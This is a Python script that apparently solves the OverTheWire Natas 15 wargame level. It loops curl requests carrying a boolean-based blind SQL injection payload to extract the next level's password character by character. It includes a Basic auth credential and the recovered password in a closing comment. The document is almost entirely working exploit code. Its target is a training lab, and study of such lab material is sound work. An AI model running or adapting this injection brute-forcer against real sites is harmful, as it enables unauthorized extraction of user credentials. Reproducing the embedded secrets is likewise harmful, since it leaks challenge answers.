import os
foo = "curl 'http://natas15.natas.labs.overthewire.org/index.php'   -H 'Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=='   -H 'Connection: keep-alive'   -H 'Origin: http://natas15.natas.labs.overthewire.org'   -H 'Referer: http://natas15.natas.labs.overthewire.org/index.php?debug'   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'   -H 'accept-language: en-US,en;q=0.9'   -H 'cache-control: max-age=0'   -H 'content-type: application/x-www-form-urlencoded'   -H 'dnt: 1'   -H 'sec-gpc: 1'   -H 'upgrade-insecure-requests: 1'   --data-raw 'username=natas16%22AND+password+LIKE+BINARY%22{0}%25'   --insecure"
guess = ""
alphanumeric = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
while True:
    finished = True
    for char in alphanumeric:
        guess += char
        print("guessing", guess)
        result = os.popen(foo.format(guess)).read()
        if ("This user exists." not in result):
            guess = guess[:-1]
        else:
            finished = False
            continue
    if finished:
        print(guess)
        break

# hPkjKYviLQctEW33QmuXL6eDVfMW4sGo